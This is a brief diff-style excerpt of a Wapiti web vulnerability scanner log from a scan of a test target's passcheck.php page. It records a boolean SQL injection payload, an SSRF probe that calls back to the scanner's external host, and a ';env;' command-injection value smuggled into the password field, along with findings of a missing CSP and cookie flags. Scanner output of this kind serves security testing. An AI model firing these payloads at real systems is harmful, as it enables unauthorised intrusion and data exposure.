+2024-03-20 14:25:37.012 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/passcheck.php (1)
+	data: password=Letm3in_%22%29%20AND%2032%3D32%20AND%20%28%2255%22%3D%2255
+2024-03-20 14:25:37.064 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module csp
+2024-03-20 14:25:37.081 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/passcheck.php (1)
+2024-03-20 14:25:37.094 | RED      | wapitiCore.attack.mod_csp:attack:58 - CSP is not set
+2024-03-20 14:25:37.170 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module ssrf
+2024-03-20 14:25:37.178 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/passcheck.php (1)
+2024-03-20 14:25:37.186 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] POST http://web/passcheck.php (0)
+	data: password=fuzz
+2024-03-20 14:25:37.186 | VERBOSE  | wapitiCore.attack.mod_ssrf:attack:175 - [¨] POST http://web/passcheck.php (0)
+	data: password=https%3A%2F%2Fwapiti3.ovh%2Fssrf%2Fnqxxox%2F1%2F70617373776f7264%2F
+2024-03-20 14:25:37.215 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] POST http://web/passcheck.php (1)
+	data: password=Letm3in_
+2024-03-20 14:25:37.231 | INFO     | wapitiCore.attack.mod_ssrf:finish:185 - [*] Asking endpoint URL https://wapiti3.ovh/get_ssrf.php?session_id=nqxxox for results, please wait...
+2024-03-20 14:25:39.323 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module cookieflags
+2024-03-20 14:25:39.339 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/passcheck.php (1)
+2024-03-20 14:25:39.340 | BLUE     | wapitiCore.attack.mod_cookieflags:attack:55 - Checking cookie : PHPSESSID
+2024-03-20 14:25:39.340 | RED      | wapitiCore.attack.mod_cookieflags:attack:57 - HttpOnly flag is not set in the cookie : PHPSESSID
+2024-03-20 14:25:39.382 | RED      | wapitiCore.attack.mod_cookieflags:attack:66 - Secure flag is not set in the cookie : PHPSESSID
+2024-03-20 14:25:39.449 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module exec
+2024-03-20 14:25:39.465 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/passcheck.php (1)
+2024-03-20 14:25:39.473 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] POST http://web/passcheck.php (0)
+	data: password=fuzz
+2024-03-20 14:25:39.475 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/passcheck.php (0)
+	data: password=%3Benv%3B
